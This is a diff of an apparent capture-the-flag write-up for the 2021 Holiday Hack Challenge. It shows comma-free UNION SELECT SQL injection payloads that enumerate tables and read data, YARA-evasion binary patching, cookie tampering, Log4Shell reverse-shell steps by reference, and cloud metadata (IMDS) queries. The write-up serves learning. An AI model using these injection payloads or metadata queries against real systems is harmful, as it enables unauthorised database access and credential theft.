@@ -222,10 +222,55 @@
 <a href="#exploit-an-sql-injection-vulnerability">Exploit an SQL injection vulnerability</a>
 <ul>
 <li class="toc-entry toc-h4"><a href="#find-the-sql-injection">Find the SQL injection</a></li>
+<li class="toc-entry toc-h4"><a href="#find-a-union-select">Find a UNION SELECT</a></li>
+<li class="toc-entry toc-h4"><a href="#enumerate-tables-and-columns">Enumerate tables and columns</a></li>
+<li class="toc-entry toc-h4"><a href="#exfiltrate">Exfiltrate</a></li>
 </ul>
 </li>
 </ul>
 </li>
+</ul>
+</li>
+<li class="toc-entry toc-h1">
+<a href="#achievements">Achievements</a>
+<ul>
+<li class="toc-entry toc-h2"><a href="#logic-munchers">Logic munchers</a></li>
+<li class="toc-entry toc-h2">
+<a href="#greeping-for-gold">Greeping for gold</a>
+<ul>
+<li class="toc-entry toc-h3"><a href="#level-1">Level 1</a></li>
+<li class="toc-entry toc-h3"><a href="#level-2">Level 2</a></li>
+<li class="toc-entry toc-h3"><a href="#level-3">Level 3</a></li>
+<li class="toc-entry toc-h3"><a href="#level-4">Level 4</a></li>
+<li class="toc-entry toc-h3"><a href="#level-5">Level 5</a></li>
+<li class="toc-entry toc-h3"><a href="#level-6">Level 6</a></li>
+</ul>
+</li>
+<li class="toc-entry toc-h2"><a href="#strace-lctrace-retrace">strace lctrace retrace</a></li>
+<li class="toc-entry toc-h2"><a href="#yara-analysis">yara analysis</a></li>
+<li class="toc-entry toc-h2"><a href="#ipv6-sandbox">IPv6 Sandbox</a></li>
+<li class="toc-entry toc-h2">
+<a href="#elf-code-python">Elf code Python</a>
+<ul>
+<li class="toc-entry toc-h3"><a href="#level-1-1">Level 1</a></li>
+<li class="toc-entry toc-h3"><a href="#level-2-1">Level 2</a></li>
+<li class="toc-entry toc-h3"><a href="#level-3-1">Level 3</a></li>
+<li class="toc-entry toc-h3"><a href="#level-4-1">Level 4</a></li>
+<li class="toc-entry toc-h3"><a href="#level-5-1">Level 5</a></li>
+<li class="toc-entry toc-h3"><a href="#level-6-1">Level 6</a></li>
+<li class="toc-entry toc-h3"><a href="#level-7">Level 7</a></li>
+<li class="toc-entry toc-h3"><a href="#level-8">Level 8</a></li>
+<li class="toc-entry toc-h3"><a href="#level-9">Level 9</a></li>
+<li class="toc-entry toc-h3"><a href="#level-10">Level 10</a></li>
+</ul>
+</li>
+<li class="toc-entry toc-h2"><a href="#document-analysis-exiftool-metadata">Document Analysis Exiftool Metadata</a></li>
+<li class="toc-entry toc-h2"><a href="#frostavator">Frostavator</a></li>
+<li class="toc-entry toc-h2"><a href="#hoho-no-fail2ban">Hoho No Fail2ban</a></li>
+<li class="toc-entry toc-h2"><a href="#santas-holiday-hero">Santas Holiday Hero</a></li>
+<li class="toc-entry toc-h2"><a href="#bonus-blue-log4jack">Bonus Blue Log4jack</a></li>
+<li class="toc-entry toc-h2"><a href="#bonus-red-log4jack">Bonus Red Log4jack</a></li>
+<li class="toc-entry toc-h2"><a href="#imds-exploration">IMDS Exploration</a></li>
 </ul>
 </li>
 </ul>
@@ -1733,43 +1778,45 @@ Who knows? Maybe you’ll even find more than one vulnerability in the code.</p>
 
 <pre><code class="bash">run -it --rm --name mysql -e MYSQL_ROOT_PASSWORD=secret -e MYSQL_USER=encontact -e MYSQL_PASSWORD=password -e MYSQL_DATABASE=encontact -d -p 127.0.0.1:3306:3306 mariadb:latest mysqld
 [sudo] Passwort für phoot1if: 
-<some docker="">
-deti <some docker=""> mysql  -uroot -psecret
-&lt;/code&gt;&lt;/pre&gt;
+&lt;some docker id&gt;
+deti &lt;some docker id&gt; mysql  -uroot -psecret
+</code></pre>
 
-Copy paste the content of `sql/encontact_db.sql` into the mysql console inside docker. After that you can run MYSQL commands directly at the database encontact.
+<p>Copy paste the content of <code class="language-plaintext highlighter-rouge">sql/encontact_db.sql</code> into the mysql console inside docker. After that you can run MYSQL commands directly at the database encontact.</p>
 
-#### Find a UNION SELECT
+<h4 id="find-a-union-select">
+<a class="anchor" href="#find-a-union-select" aria-hidden="true"><span class="octicon octicon-link"></span></a>Find a UNION SELECT</h4>
 
-Next you want to iterate the database. In mysql you therefore have to get the table `information_schema`.
-So first it is necessary to find the number of columns from your current table `uniquecontact`. Looking inside the code 
+<p>Next you want to iterate the database. In mysql you therefore have to get the table <code class="language-plaintext highlighter-rouge">information_schema</code>.
+So first it is necessary to find the number of columns from your current table <code class="language-plaintext highlighter-rouge">uniquecontact</code>. Looking inside the code</p>
 
-<img src="/blog/assets/img/hhc/2021/12_0050_uniquecontact_table" width="100%" alt="uniquecontact table">
+<p><img src="/blog/assets/img/hhc/2021/12_0050_uniquecontact_table" width="100%" alt="uniquecontact table"></p>
 
-you can count 7 columns.
+<p>you can count 7 columns.</p>
 
-A standard UNION SELECT would be like 
+<p>A standard UNION SELECT would be like</p>
 
 <pre><code class="mysql">SELECT * FROM uniquecontact WHERE id=1 OR id=2 UNION SELECT 1,2,3,4,5,6,7 -- "
 </code></pre>
 
-but this doesn't work because we have no possibility to set commas as a payload.
+<p>but this doesn’t work because we have no possibility to set commas as a payload.</p>
 
-At this point googling revealed a nice workaround with <a href="https://blog.fireheart.in/a?ID=01550-bf20ddc3-4878-49cf-9c7a-7b09cc36609d" target="_blank" rel="noopener noreferrer">JOINS</a> resulting in the payload:
+<p>At this point googling revealed a nice workaround with <a href="https://blog.fireheart.in/a?ID=01550-bf20ddc3-4878-49cf-9c7a-7b09cc36609d" target="_blank" rel="noopener noreferrer">JOINS</a> resulting in the payload:</p>
 
 <pre><code class="bash">1,2 UNION SELECT * FROM ((SELECT 1)A JOIN (SELECT 2)B JOIN (SELECT 3)C JOIN (SELECT 4)D JOIN (SELECT 5)E JOIN (SELECT 6)F JOIN (SELECT 7)G) -- 
 </code></pre>
 
-#### Enumerate tables and columns
+<h4 id="enumerate-tables-and-columns">
+<a class="anchor" href="#enumerate-tables-and-columns" aria-hidden="true"><span class="octicon octicon-link"></span></a>Enumerate tables and columns</h4>
 
-Now you can iterate the tables of database:
+<p>Now you can iterate the tables of database:</p>
 
 <pre><code class="mysql">1,2 UNION SELECT * FROM ((SELECT 1)A JOIN (SELECT 2)B JOIN ( SELECT table_name FROM information_schema.tables limit 1 offset 0)C JOIN (SELECT 4)D JOIN (SELECT 5)E JOIN (SELECT 6)F JOIN (SELECT 7)G) --
 </code></pre>
 
-Increment counter after `OFFSET` to go further.
+<p>Increment counter after <code class="language-plaintext highlighter-rouge">OFFSET</code> to go further.</p>
 
-To fetch all tables in the database you can use
+<p>To fetch all tables in the database you can use</p>
 
 <pre><code class="python">#!/usr/bin/env python3
 import urllib
@@ -1814,45 +1861,47 @@ for i in range(0,100):
         except:
 </code></pre>
 
-Among the enumerated tables there is an interesting one that fits the original question
+<p>Among the enumerated tables there is an interesting one that fits the original question</p>
 
-<blockquote>In Jack Frost's TODO list, what job position does Jack plan to offer Santa?</blockquote>
+<blockquote>
+  <p>In Jack Frost’s TODO list, what job position does Jack plan to offer Santa?&lt;/blockquote&gt;</p>
 
-<img src="/blog/assets/img/hhc/2021/12_0060_iteratetables.png" width="100%" alt="iterate tables">
+  <p><img src="/blog/assets/img/hhc/2021/12_0060_iteratetables.png" width="100%" alt="iterate tables"></p>
 
-To iterate the columns in this table use a similar approach:
+  <p>To iterate the columns in this table use a similar approach:</p>
 
-<pre><code class="mysql">1,2 UNION SELECT * FROM ((SELECT 1)A JOIN (SELECT 2)B JOIN ( SELECT column_name FROM information_schema.columns where table_name='todo' limit 1 offset 0)C JOIN (SELECT 4)D JOIN (SELECT 5)E JOIN (SELECT 6)F JOIN (SELECT 7)G) --
+  <pre><code class="mysql">1,2 UNION SELECT * FROM ((SELECT 1)A JOIN (SELECT 2)B JOIN ( SELECT column_name FROM information_schema.columns where table_name='todo' limit 1 offset 0)C JOIN (SELECT 4)D JOIN (SELECT 5)E JOIN (SELECT 6)F JOIN (SELECT 7)G) --
 </code></pre>
 
-and increment the value after `OFFSET`. You will get:
+  <p>and increment the value after <code class="language-plaintext highlighter-rouge">OFFSET</code>. You will get:</p>
 
-<pre><code class="bash">id note completed
-</code></pre>   
-
-#### Exfiltrate
-
-Let look inside the columns of `note`:
-
-<pre><code class="mysql">1,2 UNION SELECT * FROM ((SELECT 1)A JOIN (SELECT 2)B JOIN ( SELECT note FROM todo where id=0)C JOIN (SELECT 4)D JOIN (SELECT 5)E JOIN (SELECT 6)F JOIN (SELECT 7)G) --
+  <pre><code class="bash">id note completed
 </code></pre>
 
-Nothing.
+  <h4 id="exfiltrate">
+<a class="anchor" href="#exfiltrate" aria-hidden="true"><span class="octicon octicon-link"></span></a>Exfiltrate</h4>
 
-<pre><code class="mysql">1,2 UNION SELECT * FROM ((SELECT 1)A JOIN (SELECT 2)B JOIN ( SELECT note FROM todo where id=1)C JOIN (SELECT 4)D JOIN (SELECT 5)E JOIN (SELECT 6)F JOIN (SELECT 7)G) --
+  <p>Let look inside the columns of <code class="language-plaintext highlighter-rouge">note</code>:</p>
+
+  <pre><code class="mysql">1,2 UNION SELECT * FROM ((SELECT 1)A JOIN (SELECT 2)B JOIN ( SELECT note FROM todo where id=0)C JOIN (SELECT 4)D JOIN (SELECT 5)E JOIN (SELECT 6)F JOIN (SELECT 7)G) --
 </code></pre>
 
-<pre><code class="bash">Buy up land all around Santa's Castle
+  <p>Nothing.</p>
+
+  <pre><code class="mysql">1,2 UNION SELECT * FROM ((SELECT 1)A JOIN (SELECT 2)B JOIN ( SELECT note FROM todo where id=1)C JOIN (SELECT 4)D JOIN (SELECT 5)E JOIN (SELECT 6)F JOIN (SELECT 7)G) --
 </code></pre>
 
-id=2 :
-
-<pre><code class="bash">Build bigger and more majestic tower next to Santa's
+  <pre><code class="bash">Buy up land all around Santa's Castle
 </code></pre>
 
-id=3..9:
+  <p>id=2 :</p>
 
-<pre><code class="bash">Erode Santa's influence at the North Pole via FrostFest, the greatest Con in history
+  <pre><code class="bash">Build bigger and more majestic tower next to Santa's
+</code></pre>
+
+  <p>id=3..9:</p>
+
+  <pre><code class="bash">Erode Santa's influence at the North Pole via FrostFest, the greatest Con in history
 Dishearten Santa's elves and encourage defection to our cause
 Steal Santa's sleigh technology and build a competing and way better Frosty present delivery vehicle
 Undermine Santa's ability to deliver presents on 12/24 through elf staff shortages, technology glitches, and assorted mayhem
@@ -1861,61 +1910,70 @@ SAVE THE DAY by delivering Frosty presents using merch from the Frost Tower Gift
 With Santa defeated, offer the old man a job as a clerk in the Frost Tower Gift Shop so we can keep an eye on him
 </code></pre>
 
-So the solution is
+  <p>So the solution is</p>
 
-`clerk`
+  <p><code class="language-plaintext highlighter-rouge">clerk</code></p>
 
-# Achievements
+  <h1 id="achievements">
+<a class="anchor" href="#achievements" aria-hidden="true"><span class="octicon octicon-link"></span></a>Achievements</h1>
 
-## Logic munchers
+  <h2 id="logic-munchers">
+<a class="anchor" href="#logic-munchers" aria-hidden="true"><span class="octicon octicon-link"></span></a>Logic munchers</h2>
 
-Understand the boolean logic and play the mentioned level
+  <p>Understand the boolean logic and play the mentioned level</p>
 
-## Greeping for gold
+  <h2 id="greeping-for-gold">
+<a class="anchor" href="#greeping-for-gold" aria-hidden="true"><span class="octicon octicon-link"></span></a>Greeping for gold</h2>
 
-### Level 1
+  <h3 id="level-1">
+<a class="anchor" href="#level-1" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 1</h3>
 
-<pre><code class="bash">grep '34.76.1.22' bigscan.gnmap
+  <pre><code class="bash">grep '34.76.1.22' bigscan.gnmap
 Host: 34.76.1.22 ()     Status: Up
 Host: 34.76.1.22 ()     Ports: 62078/open/tcp//iphone-sync///      Ignored State: closed (999)
 </code></pre>
-=&gt; 62078
+  <p>=&gt; 62078</p>
 
-### Level 2
+  <h3 id="level-2">
+<a class="anchor" href="#level-2" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 2</h3>
 
-<pre><code class="bash">grep '34.77.207.226' bigscan.gnmap
+  <pre><code class="bash">grep '34.77.207.226' bigscan.gnmap
 Host: 34.77.207.226 ()     Status: Up
 Host: 34.77.207.226 ()     Ports: 8080/open/tcp//http-proxy///      Ignored State: filtered (999)
 </code></pre>
 
-=&gt; 8080
+  <p>=&gt; 8080</p>
 
-### Level 3
+  <h3 id="level-3">
+<a class="anchor" href="#level-3" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 3</h3>
 
-<pre><code class="bash">grep 'Up' bigscan.gnmap | wc -l
+  <pre><code class="bash">grep 'Up' bigscan.gnmap | wc -l
 26054</code></pre>
 
-=&gt; 26054
+  <p>=&gt; 26054</p>
 
-### Level 4
+  <h3 id="level-4">
+<a class="anchor" href="#level-4" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 4</h3>
 
-<pre><code class="bash">grep -E '(\s80|\s443|\s8080)\/open' bigscan.gnmap | wc -l
+  <pre><code class="bash">grep -E '(\s80|\s443|\s8080)\/open' bigscan.gnmap | wc -l
 14372</code></pre>
 
-=&gt; 14372
+  <p>=&gt; 14372</p>
 
-### Level 5
+  <h3 id="level-5">
+<a class="anchor" href="#level-5" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 5</h3>
 
-<pre><code class="bash">echo $((`grep 'Up' -A 1 bigscan.gnmap | grep Up | wc -l` - `grep 'Up' -A 1 bigscan.gnmap | grep Port |  wc -l`))
+  <pre><code class="bash">echo $((`grep 'Up' -A 1 bigscan.gnmap | grep Up | wc -l` - `grep 'Up' -A 1 bigscan.gnmap | grep Port |  wc -l`))
 402</code></pre>
 
-=&gt; 402
+  <p>=&gt; 402</p>
 
-### Level 6
+  <h3 id="level-6">
+<a class="anchor" href="#level-6" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 6</h3>
 
-<pre><code class="bash">while read p; do out1=$(echo $p| cut -f 2 -d " ");out2=$(echo -n $p|grep -o "open"|wc -l); echo "$out1  $out2"; done &lt; &lt;(grep "Ports" bigscan.gnmap) &gt; ot</code></pre>
+  <pre><code class="bash">while read p; do out1=$(echo $p| cut -f 2 -d " ");out2=$(echo -n $p|grep -o "open"|wc -l); echo "$out1  $out2"; done &lt; &lt;(grep "Ports" bigscan.gnmap) &gt; ot</code></pre>
 
-<pre><code class="bash">sort -k2 -n ot | tail
+  <pre><code class="bash">sort -k2 -n ot | tail
 34.79.226.71 11
 34.79.238.251 11
 34.79.251.175 11
@@ -1927,11 +1985,12 @@ Host: 34.77.207.226 ()     Ports: 8080/open/tcp//http-proxy///      Ignored Stat
 34.79.22.38 12
 34.79.94.34 12</code></pre>
 
-=&gt; 12
+  <p>=&gt; 12</p>
 
-## strace lctrace retrace
+  <h2 id="strace-lctrace-retrace">
+<a class="anchor" href="#strace-lctrace-retrace" aria-hidden="true"><span class="octicon octicon-link"></span></a>strace lctrace retrace</h2>
 
-<pre><code class="bash">ls -&gt; file: "make the candy"
+  <pre><code class="bash">ls -&gt; file: "make the candy"
 ./make the candy -&gt; Unable to open configuration file
 ltrace ./make the candy -&gt; fopen("registration.json","r")
 echo '{"a:"b"}' &gt; registration.json
@@ -1941,21 +2000,23 @@ ltrace ./make the candy -&gt; strstr(":"b"}\n","True")
 echo '{"Registration":"True"}' &gt; registration.json
 </code></pre>
 
-## yara analysis
+  <h2 id="yara-analysis">
+<a class="anchor" href="#yara-analysis" aria-hidden="true"><span class="octicon octicon-link"></span></a>yara analysis</h2>
 
-Run the program "the_critical_elf_app" and look at the output: "yara_rule_135 ./the_critical_elf_app"
-yara_rule_135 has the condition "candycane" in the yara_rules folder.
+  <p>Run the program “the_critical_elf_app” and look at the output: “yara_rule_135 ./the_critical_elf_app”
+yara_rule_135 has the condition “candycane” in the yara_rules folder.
 So change this string using vim in the binary
-Next rule looks for hex at the end of the string "This is critical for the execution of this program!!". 
+Next rule looks for hex at the end of the string “This is critical for the execution of this program!!”. 
 Replace this too in the binary using vim.
 The rule 1732 has an and condition including the filesize. So cat the file as often together until it is larger than 50 KB.
-If the binary doesnt work after that, change the before mentioned values in all findings in the file.
+If the binary doesnt work after that, change the before mentioned values in all findings in the file.</p>
 
-## IPv6 Sandbox
+  <h2 id="ipv6-sandbox">
+<a class="anchor" href="#ipv6-sandbox" aria-hidden="true"><span class="octicon octicon-link"></span></a>IPv6 Sandbox</h2>
 
-First check normal IPv4 stuff:
+  <p>First check normal IPv4 stuff:</p>
 
-<pre><code>ip neigh -&gt; get arp and ndp  findings -&gt; 192.168.160.1, fe80::1, fe80::42:c0ff:fea8:a002
+  <pre><code>ip neigh -&gt; get arp and ndp  findings -&gt; 192.168.160.1, fe80::1, fe80::42:c0ff:fea8:a002
 nmap 192.168.160.1 -p- -&gt; 22,3000,8000 open
 ping IPv6 
 -&gt; ping6 ff02::1 -c2
@@ -1968,17 +2029,20 @@ curl
 -&gt; curl --interface eth0 http://[fe80::42::c0ff:fea8:a002]:9000/
 "PieceOnEarth"
 </code></pre>
-Place this string in the top terminal as solution
+  <p>Place this string in the top terminal as solution</p>
 
-## Elf code Python
+  <h2 id="elf-code-python">
+<a class="anchor" href="#elf-code-python" aria-hidden="true"><span class="octicon octicon-link"></span></a>Elf code Python</h2>
 
-### Level 1
+  <h3 id="level-1-1">
+<a class="anchor" href="#level-1-1" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 1</h3>
 
-Just run the code
+  <p>Just run the code</p>
 
-### Level 2
+  <h3 id="level-2-1">
+<a class="anchor" href="#level-2-1" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 2</h3>
 
-<pre><code class="python">import elf, munchkins, levers, lollipops, yeeters, pits
+  <pre><code class="python">import elf, munchkins, levers, lollipops, yeeters, pits
 elf.moveLeft(10)
 elf.moveUp(2)
 elf.moveRight(3)
@@ -1987,9 +2051,10 @@ elf.moveLeft(3)
 elf.moveUp(2)
 </code></pre>
 
-### Level 3
+  <h3 id="level-3-1">
+<a class="anchor" href="#level-3-1" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 3</h3>
 
-<pre><code class="python">import elf, munchkins, levers, lollipops, yeeters, pits
+  <pre><code class="python">import elf, munchkins, levers, lollipops, yeeters, pits
 lever0 = levers.get(0)
 modified_data=lever0.data()+2
 elf.moveLeft(6)
@@ -1998,9 +2063,10 @@ elf.moveLeft(4)
 elf.moveUp(10)
 </code></pre>
 
-### Level 4
+  <h3 id="level-4-1">
+<a class="anchor" href="#level-4-1" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 4</h3>
 
-<pre><code class="python">import elf, munchkins, levers, lollipops, yeeters, pits
+  <pre><code class="python">import elf, munchkins, levers, lollipops, yeeters, pits
 # Complete the code below:
 lever0, lever1, lever2, lever3, lever4 = levers.get()
 # Move onto lever4
@@ -2019,9 +2085,10 @@ lever0.pull({})
 elf.moveUp(2)
 </code></pre>
 
-### Level 5
+  <h3 id="level-5-1">
+<a class="anchor" href="#level-5-1" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 5</h3>
 
-<pre><code class="python">import elf, munchkins, levers, lollipops, yeeters, pits
+  <pre><code class="python">import elf, munchkins, levers, lollipops, yeeters, pits
 # Fix/Complete Code below
 lever0, lever1, lever2, lever3, lever4 = levers.get()
 # Solve for each lever, moving to the space
@@ -2043,9 +2110,10 @@ lever0.pull(d)
 elf.moveUp(2)
 </code></pre>
 
-### Level 6
+  <h3 id="level-6-1">
+<a class="anchor" href="#level-6-1" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 6</h3>
 
-<pre><code class="python">import elf, munchkins, levers, lollipops, yeeters, pits
+  <pre><code class="python">import elf, munchkins, levers, lollipops, yeeters, pits
 # Fix/Complete the below code
 lever = levers.get(0)
 data = lever.data()
@@ -2062,9 +2130,10 @@ lever.pull(data)
 elf.moveUp(2)
 </code></pre>
 
-### Level 7
+  <h3 id="level-7">
+<a class="anchor" href="#level-7" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 7</h3>
 
-<pre><code class="python">import elf, munchkins, levers, lollipops, yeeters, pits
+  <pre><code class="python">import elf, munchkins, levers, lollipops, yeeters, pits
 for num in range(5): #not sure if number is right
   elf.moveLeft(3)
   if num % 2 == 0:
@@ -2073,9 +2142,10 @@ for num in range(5): #not sure if number is right
     elf.moveDown(12)
 </code></pre>
 
-### Level 8
+  <h3 id="level-8">
+<a class="anchor" href="#level-8" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 8</h3>
 
-<pre><code class="python">import elf, munchkins, levers, lollipops, yeeters, pits
+  <pre><code class="python">import elf, munchkins, levers, lollipops, yeeters, pits
 all_lollipops = lollipops.get()
 for lollipop in all_lollipops:
   elf.moveTo(lollipop.position)
@@ -2088,9 +2158,10 @@ elf.moveDown(5)
 elf.moveTo({"x":2,"y":2})
 </code></pre>
 
-### Level 9
+  <h3 id="level-9">
+<a class="anchor" href="#level-9" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 9</h3>
 
-<pre><code class="python">import elf, munchkins, levers, lollipops, yeeters, pits
+  <pre><code class="python">import elf, munchkins, levers, lollipops, yeeters, pits
 
 def func_to_pass_to_mucnhkin(list_of_lists):
   sum_of_ints_in_list_of_lists = 0
@@ -2119,9 +2190,10 @@ munchkin.answer(func_to_pass_to_mucnhkin)
 elf.moveUp(1)
 </code></pre>
 
-### Level 10
+  <h3 id="level-10">
+<a class="anchor" href="#level-10" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 10</h3>
 
-<pre><code class="python">import elf, munchkins, levers, lollipops, yeeters, pits
+  <pre><code class="python">import elf, munchkins, levers, lollipops, yeeters, pits
 import time
 muns = munchkins.get()
 lols = lollipops.get()[::-1]
@@ -2136,52 +2208,54 @@ for index, mun in enumerate(muns):
 elf.moveTo({"x":2,"y":2})
 </code></pre>
 
-## Document Analysis Exiftool Metadata
+  <h2 id="document-analysis-exiftool-metadata">
+<a class="anchor" href="#document-analysis-exiftool-metadata" aria-hidden="true"><span class="octicon octicon-link"></span></a>Document Analysis Exiftool Metadata</h2>
 
-<pre><code class="bash">exiftool * | grep "Jack Frost" -C 45 | grep "^File Name"</code></pre>
-=&gt; 2021-12-21.docx
+  <pre><code class="bash">exiftool * | grep "Jack Frost" -C 45 | grep "^File Name"</code></pre>
+  <p>=&gt; 2021-12-21.docx</p>
 
-## Frostavator
+  <h2 id="frostavator">
+<a class="anchor" href="#frostavator" aria-hidden="true"><span class="octicon octicon-link"></span></a>Frostavator</h2>
 
-<pre><code>xor nor xnor
+  <pre><code>xor nor xnor
 and nand or
 </code></pre>
 
-## Hoho No Fail2ban
+  <h2 id="hoho-no-fail2ban">
+<a class="anchor" href="#hoho-no-fail2ban" aria-hidden="true"><span class="octicon octicon-link"></span></a>Hoho No Fail2ban</h2>
 
-Look into
-`cat /var/log/hohono.log` to get an overview
+  <p>Look into
+<code class="language-plaintext highlighter-rouge">cat /var/log/hohono.log</code> to get an overview</p>
 
-PoC to find the regex which shouldnt be allowed:
+  <p>PoC to find the regex which shouldnt be allowed:</p>
 
- ```
- cat /var/log/hohono.log  | grep -v successful | grep -v Valid | grep -v 'Invalid heartbeat' | grep -v   'rejected due to unknown user' | grep -v 'sent a malformed request' | grep -v 'Failed login'
+  <div class="language-plaintext highlighter-rouge">
+<div class="highlight"><pre class="highlight"><code> cat /var/log/hohono.log  | grep -v successful | grep -v Valid | grep -v 'Invalid heartbeat' | grep -v   'rejected due to unknown user' | grep -v 'sent a malformed request' | grep -v 'Failed login'
  root@3ee23184d155:~#
- ```
+</code></pre></div>  </div>
 
-
-vim /etc/fail2ban/filter.d/naughtylistservice.conf
-=&gt;
-```
-cat /etc/fail2ban/filter.d/naughtylistservice.conf
+  <p>vim /etc/fail2ban/filter.d/naughtylistservice.conf
+=&gt;</p>
+  <div class="language-plaintext highlighter-rouge">
+<div class="highlight"><pre class="highlight"><code>cat /etc/fail2ban/filter.d/naughtylistservice.conf
 [Definition]
-failregex = Invalid heartbeat '.*' from <host>
-Login from <host> rejected due to unknown user name
-<host> sent a malformed request
-Failed login from <host> for .*
-```
-vim /etc/fail2ban/action.d/naughtylistservice.conf
-=&gt;
-```
-cat /etc/fail2ban/action.d/naughtylistservice.conf
+failregex = Invalid heartbeat '.*' from &lt;HOST&gt;
+Login from &lt;HOST&gt; rejected due to unknown user name
+&lt;HOST&gt; sent a malformed request
+Failed login from &lt;HOST&gt; for .*
+</code></pre></div>  </div>
+  <p>vim /etc/fail2ban/action.d/naughtylistservice.conf
+=&gt;</p>
+  <div class="language-plaintext highlighter-rouge">
+<div class="highlight"><pre class="highlight"><code>cat /etc/fail2ban/action.d/naughtylistservice.conf
 [Definition]
-actionban = /root/naughtylist add <ip>
-```
+actionban = /root/naughtylist add &lt;ip&gt;
+</code></pre></div>  </div>
 
-vim /etc/fail2ban/jail.d/naughtylistservice.conf
-=&gt;
-```
-cat /etc/fail2ban/jail.d/naughtylistservice.conf
+  <p>vim /etc/fail2ban/jail.d/naughtylistservice.conf
+=&gt;</p>
+  <div class="language-plaintext highlighter-rouge">
+<div class="highlight"><pre class="highlight"><code>cat /etc/fail2ban/jail.d/naughtylistservice.conf
 # service name
 [naughtylistservice]
 # tune on / off
@@ -2195,23 +2269,25 @@ logpath = /var/log/hohono.log
 maxretry = 10
 findtime = 3600
 action = naughtylistservice
-```
+</code></pre></div>  </div>
 
-service fail2ban restart
+  <p>service fail2ban restart
 fail2ban-client status
 fail2ban-client status naughtylistservice
-/root/naughtylist refresh
+/root/naughtylist refresh</p>
 
-## Santas Holiday Hero
+  <h2 id="santas-holiday-hero">
+<a class="anchor" href="#santas-holiday-hero" aria-hidden="true"><span class="octicon octicon-link"></span></a>Santas Holiday Hero</h2>
 
-Set cookie "HOHOHO" to "%7B%22single_player%22%%3Atrue%7D"
+  <p>Set cookie “HOHOHO” to “%7B%22single_player%22%%3Atrue%7D”
 Set a breakpoint at holidayhero.min.js:736
 Goto console and set single_player_mode=true
-=&gt; Play together with SYSTEM and win
+=&gt; Play together with SYSTEM and win</p>
 
-## Bonus Blue Log4jack
+  <h2 id="bonus-blue-log4jack">
+<a class="anchor" href="#bonus-blue-log4jack" aria-hidden="true"><span class="octicon octicon-link"></span></a>Bonus Blue Log4jack</h2>
 
-<pre><code class="bash">-&gt; Y
+  <pre><code class="bash">-&gt; Y
 -&gt; ls
 -&gt; next
 -&gt; cd vulnerable
@@ -2252,13 +2328,14 @@ Goto console and set single_player_mode=true
 -&gt; next
 </code></pre>
 
-## Bonus Red Log4jack
+  <h2 id="bonus-red-log4jack">
+<a class="anchor" href="#bonus-red-log4jack" aria-hidden="true"><span class="octicon octicon-link"></span></a>Bonus Red Log4jack</h2>
 
-Follow all the steps in <a href="https://gist.github.com/joswr1ght/fb361f1f1e58307048aae5c0f38701e4" target="_blank" rel="noopener noreferrer">https://gist.github.com/joswr1ght/fb361f1f1e58307048aae5c0f38701e4</a> 
-and replace WEBSERVERIP, NETCATIP and MARSHALSECIP with your ip (`ip a`).
+  <p>Follow all the steps in <a href="https://gist.github.com/joswr1ght/fb361f1f1e58307048aae5c0f38701e4" target="_blank" rel="noopener noreferrer">https://gist.github.com/joswr1ght/fb361f1f1e58307048aae5c0f38701e4</a> 
+and replace WEBSERVERIP, NETCATIP and MARSHALSECIP with your ip (<code class="language-plaintext highlighter-rouge">ip a</code>).</p>
 
-Answer text from `/home/solr/kringle.txt` is
-<pre><code>"""
+  <p>Answer text from <code class="language-plaintext highlighter-rouge">/home/solr/kringle.txt</code> is</p>
+  <pre><code>"""
 The solution to Log4shell is patching
 Sincerely,
 
@@ -2266,119 +2343,120 @@ Santa
 """
 </code></pre>
 
-So  
-"patching" is what you search.
+  <p>So<br>
+“patching” is what you search.</p>
 
-## IMDS Exploration
+  <h2 id="imds-exploration">
+<a class="anchor" href="#imds-exploration" aria-hidden="true"><span class="octicon octicon-link"></span></a>IMDS Exploration</h2>
 
-To start the challenge enter:
+  <p>To start the challenge enter:</p>
 
-<pre><code class="bash">Yes
+  <pre><code class="bash">Yes
 </code></pre>
 
-<pre><code>The Instance Metadata Service (IMDS) is a virtual server for cloud assets at the IP address
+  <pre><code>The Instance Metadata Service (IMDS) is a virtual server for cloud assets at the IP address
 169.254.169.254. Send a couple ping packets to the server.
 </code></pre>
 
-<pre><code class="bash">ping -c 3 169.254.169.254
+  <pre><code class="bash">ping -c 3 169.254.169.254
 </code></pre>
 
-<pre><code>IMDS provides information about currently running virtual machine instances. You can use it
+  <pre><code>IMDS provides information about currently running virtual machine instances. You can use it
 to manage and configure cloud nodes. IMDS is used by all major cloud providers.
 Run 'next' to continue.
 </code></pre>
 
-<pre><code class="bash">next
+  <pre><code class="bash">next
 </code></pre>
 
-<pre><code>Developers can automate actions using IMDS. We'll interact with the server using the cURL
+  <pre><code>Developers can automate actions using IMDS. We'll interact with the server using the cURL
 tool. Run 'curl http://169.254.169.254' to access IMDS data.
 </code></pre>
 
-<pre><code class="bash">curl http://169.254.169.254
+  <pre><code class="bash">curl http://169.254.169.254
 </code></pre>
 
-<pre><code>Different providers will have different formats for IMDS data. We're using an AWS-
+  <pre><code>Different providers will have different formats for IMDS data. We're using an AWS-
 compatible
 IMDS server that returns 'latest' as the default response. Access the 'latest' endpoint.
 Run 'curl http://169.254.169.254/latest'
 </code></pre>
 
-<pre><code class="bash">curl http://169.254.169.254/latest
+  <pre><code class="bash">curl http://169.254.169.254/latest
 </code></pre>
 
-<pre><code>IMDS returns two new endpoints: dynamic and meta-data. Let's start with the dynamic
+  <pre><code>IMDS returns two new endpoints: dynamic and meta-data. Let's start with the dynamic
 endpoint, which provides information about the instance itself. Repeat the request
 to access the dynamic endpoint: 'curl http://169.254.169.254/latest/dynamic'.
 </code></pre>
 
-<pre><code class="bash">curl http://169.254.169.254/latest/dynamic
+  <pre><code class="bash">curl http://169.254.169.254/latest/dynamic
 </code></pre>
 
